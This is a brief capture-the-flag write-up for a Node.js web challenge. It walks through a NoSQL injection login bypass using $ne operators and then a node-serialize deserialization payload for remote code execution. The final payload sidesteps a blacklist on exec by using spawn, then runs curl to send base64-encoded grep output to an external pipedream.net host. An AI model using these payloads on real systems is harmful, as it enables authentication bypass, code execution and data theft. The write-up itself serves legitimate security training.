# Web 04
## NoSQL
A nodejs application that first introduces a NoSQL injection in login page.
We can bypass authentication by using `username[$ne]=test&password[$ne]=test` in the POST data when logging in.<br>

## RCE
We continue to enumerate users until we find user with admin permissions.
This user was `itachi`. <br>
After logging in to this account we see new endpoint called `/checktoken`
This endpoint accepts base64 encoded data to it. Example content:
```
{"cookie":{"path":"/","_expires":null,"originalMaxAge":null,"httpOnly":true},"islogin":true,"isadmin":true,"username":"itachi","email":"itachi@whitehat.com","slogan":"Try Hard!!","country":"US"}
```
Since we had no source, we tried different options on how to proceed from here. The working solution was to try deserialization payload, which surprisingly worked.

The data that is passed to the endpoint now looks like this:
```
{"cookie":{"rce":"_$$ND_FUNC$$_function (){/* JS CODE HERE */}()"},"islogin":true,"isadmin":true,"username":"itachi","email":"itachi@whitehat.com","slogan":{"$ne":"Try Hard!!"},"country":{"toString":"XXXX"}}
```
After trying some javascript code we see that some functions are blacklisted, for example `exec` function.
This is not a big deal, as the `spawn` function is allowed. The final payload that was used for flag exfiltration is shown below:

```
{"cookie":{"rce":"_$$ND_FUNC$$_function (){\n \t throw require('child_process').spawn('bash', ['-c','curl https://enlo143u2fju.x.pipedream.net/$(grep -rain whitehat|base64 -w0)']);\n }()"},"islogin":true,"isadmin":true,"username":"itachi","email":"itachi@whitehat.com","slogan":{"$ne":"Try Hard!!"},"country":{"toString":"XXXX"}}
```

## Flag
`WhiteHat{Good_Boy_Nodejs_Unserialize}`
